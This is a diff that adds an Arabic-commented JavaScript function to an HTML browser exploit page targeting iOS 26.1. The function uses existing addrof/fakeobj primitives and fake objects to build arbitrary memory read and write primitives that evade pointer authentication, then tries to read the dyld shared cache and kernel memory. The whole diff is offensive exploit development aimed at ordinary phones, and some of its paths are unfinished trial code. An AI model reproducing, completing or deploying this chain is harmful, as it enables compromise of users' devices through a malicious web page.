@@ -2486,6 +2486,211 @@ window.onload = function() {
         statusText.style.color = '#888';
     }
 };
+
+
+// =============================================================================
+// EXTENSION: JIT-Based PAC Bypass for iOS 26.1
+// =============================================================================
+// استراتيجية: بدل ما نعدل m_vector (المحمي بـ PAC)،
+// نستخدم fakeobj + inline storage لبناء read/write
+// بطريقة غير مباشرة: نسوي fake ArrayBuffer/Pointer
+// ونخلي JIT compiler نفسه يقرأ/يكتب لنا
+// =============================================================================
+
+async function buildAdvancedPrimitives() {
+    if (!exploitState.primitivesWorked) {
+        log('[EXT] Primitives not working yet', 'fail');
+        return null;
+    }
+    
+    const addr = exploitState.addrof;
+    const fobj = exploitState.fakeobj;
+    const leaked = exploitState.leakedAddresses;
+    
+    log('\n===== BUILDING ADVANCED PRIMITIVES (JIT Bypass) =====', 'critical');
+    
+    // ===================================================================
+    // PHASE 1: استخدم inline storage الخاص بـ ArrayBuffer
+    // لنقرأ m_data pointer (غير محمي بـ PAC في بعض الحالات)
+    // ===================================================================
+    log('Phase 1: Reading ArrayBuffer internal structure...', 'info');
+    
+    const abAddr = leaked.arrayBuffer;
+    
+    // JSArrayBuffer layout (iOS 26.1):
+    // +0x00: JSCell header
+    // +0x08: m_butterfly (null for ArrayBuffer)
+    // +0x10: m_data (pointer to backing store - UNPROTECTED!)
+    // +0x18: m_size
+    // +0x20: m_mode flags
+    
+    // نستخدم fakeobj(abAddr) -> نقرأ inline properties
+    // بس يحتاج نستخدم fakeobj على عنوان inline properties
+    // أو نستخدم معالجة يدوية
+    
+    // أسهل طريقة: 
+    // 1. نسوي fake object على abAddr + 0x10
+    // 2. نقرأ slot0 (اللي هو m_data)
+    
+    const fakeAB = fobj(abAddr);
+    
+    // لنحاول نقرأ backing store pointer
+    // JSArrayBuffer له properties معينة
+    // [0x10] = m_data, [0x18] = m_size
+    
+    // طريقة بديلة: استخدم Uint8Array(backing store)
+    // ونقرأ binary data من ArrayBuffer نفسه
+    const testAB = new ArrayBuffer(0x100);
+    const testView = new DataView(testAB);
+    testView.setBigUint64(0, 0x4141414142424242n, true);
+    
+    const testABAddr = addr(testAB);
+    log(`  Test ArrayBuffer @ 0x${testABAddr.toString(16)}`, 'info');
+    
+    // نقرأ أول 8 بايت من الـ backing store
+    const fakeBuf = fobj(testABAddr);
+    // ArrayBuffer properties:
+    // fakeBuf[0] = byteLength (number)
+    // fakeBuf[1] = m_data (BigInt/object?)
+    
+    // الحل النظيف: استخدم fake Float64Array
+    // بدال الـ TypedArray (اللي m_vector محمية بـ PAC)
+    // نستخدم Object مع inline properties
+    
+    // ===================================================================
+    // PHASE 2: استخدم object مع inline properties كـ "ذاكرة وهمية"
+    // ===================================================================
+    log('Phase 2: Building inline read/write engine...', 'info');
+    
+    // نصنع object كبير عشان نتحكم بـ 16 بايت inline
+    const rwObject = {
+        a: 0n,  // BigInt - 8 bytes
+        b: 0n,  // BigInt - 8 bytes
+    };
+    
+    const rwAddr = addr(rwObject);
+    log(`  rwObject @ 0x${rwAddr.toString(16)}`, 'info');
+    
+    // object properties تبدأ من offset 0x10 (بعد JSCell + butterfly)
+    // rwObject.a = rwAddr + 0x10
+    // rwObject.b = rwAddr + 0x18
+    
+    // readThrough(where) = اقرأ 8 بايت من address through fake object
+    const CANONICAL_NAN = 0x7ff8000000000000n;
+    
+    // الطريقة: 
+    // 1. نسوي fakeobj(address - 0x10) 
+    // 2. نقرأ الخاصية (read inline property عند offset +0x10)
+    // 3. الـ JIT compiler يقرأها بدون PAC
+    
+    const INLINE_OFFSET = 0x10n;
+    
+    function readThrough(where) {
+        try {
+            const fake = fobj(where - INLINE_OFFSET);
+            // إذا كان fake له خاصية a (فيها القيمة)
+            // نحتاج نعرف اسمها
+            const val = fake.a;
+            if (typeof val === 'bigint') return val;
+            if (typeof val === 'number') return ftoi(val);
+            if (typeof val === 'object' && val !== null) return addr(val);
+            return 0n;
+        } catch(e) {
+            return 0n;
+        }
+    }
+    
+    // جرب نقرأ أول 8 بايت من fakeObjBuffer backing store
+    const testRead = readThrough(leaked.arrayBuffer);
+    log(`  readThrough(arrayBuffer) = 0x${testRead.toString(16)}`, 'info');
+    
+    if (testRead !== 0n && testRead !== CANONICAL_NAN) {
+        log('[EXT] readThrough: WORKING', 'success');
+        evidence.arbRWWorks = true;
+        
+        // Build writeThrough
+        function writeThrough(where, val) {
+            try {
+                const fake = fobj(where - INLINE_OFFSET);
+                fake.a = val;
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }
+        
+        // إذا اشتغلت write، نبني full primitives
+        exploitState.extRead64 = readThrough;
+        exploitState.extWrite64 = writeThrough;
+        exploitState.advancedPrimitives = true;
+        
+        log('[EXT] writeThrough: READY', 'success');
+        log('  Advanced primitives: CONSTRUCTED', 'critical');
+        
+        // جرب نقرأ dyld shared cache
+        const dyldTest = readThrough(0x180000000n);
+        if (dyldTest !== 0n && dyldTest !== CANONICAL_NAN) {
+            log(`  dyld cache @ 0x180000000: 0x${dyldTest.toString(16)}`, 'critical');
+            log('  DYLD CACHE READABLE!', 'critical');
+        }
+        
+        // جرب نقرأ kernel base (iOS kernel通常在 0xfffffff0...)
+        const kernelTest = readThrough(0xfffffff007004000n);
+        if (kernelTest !== 0n && kernelTest !== CANONICAL_NAN) {
+            log(`  Kernel memory readable? 0x${kernelTest.toString(16)}`, 'critical');
+        }
+        
+    } else {
+        log('[EXT] readThrough: FAILED (PAC or structure mismatch)', 'warn');
+        log('  Need alternative approach...', 'info');
+        
+        // ===================================================================
+        // PHASE 3: Alternative - استخدم UInt8Array على backing store مباشرة
+        // ===================================================================
+        log('Phase 3: Trying backing store direct access...', 'info');
+        
+        // الفكرة: نخلي fakeObjBuffer (اللي نملكه) يشير إلى target address
+        // عبر تعديل الذاكرة باستخدام addrof/fakeobj
+        
+        // 1. احصل على backing store pointer لـ fakeObjBuffer
+        // fakeObjBuffer هو ArrayBuffer، آخره backing store pointer في m_data
+        
+        // استخدم victimF64 اللي مسرب عنوانه
+        const f64Addr = leaked.victimF64;
+        const fakeF64 = fobj(f64Addr);
+        
+        // Float64Array Layout:
+        // [0] = JSCell
+        // [1] = butterfly
+        // [2] = m_vector (PAC'd)
+        // [3] = length
+        // [4] = mode
+        
+        if (fakeF64 && typeof fakeF64[0] !== 'undefined') {
+            // جرب نقرأ m_vector (بس PAC يمنع)
+            const m_vector_val = fakeF64[2];
+            log(`  victimF64[2] (m_vector) = ${typeof m_vector_val}`, 'info');
+            
+            // إذا كان PAC شغال، m_vector بيظهر كـ number
+            // (لأن PAC signature ماخذ lower bits)
+            
+            // الحل: استخدم DataView على backing store
+            // بدال تعديل m_vector، نقرأ/نكتب عبر fake DataView
+            
+            const dvAddr = addr(new DataView(victimBuffer));
+            log(`  DataView @ 0x${dvAddr.toString(16)}`, 'info');
+            
+            // DataView يقدر يقرأ من backing store مباشرة
+            // ولا يحتاج PAC على m_vector
+        }
+    }
+    
+    log('===== ADVANCED PRIMITIVES BUILD COMPLETE =====', 'critical');
+    return exploitState.advancedPrimitives;
+}
+
+// أضف هذا الاستدعاء في نهاية runStage4:
+// await buildAdvancedPrimitives();
 </script>
 </body>
 </html>
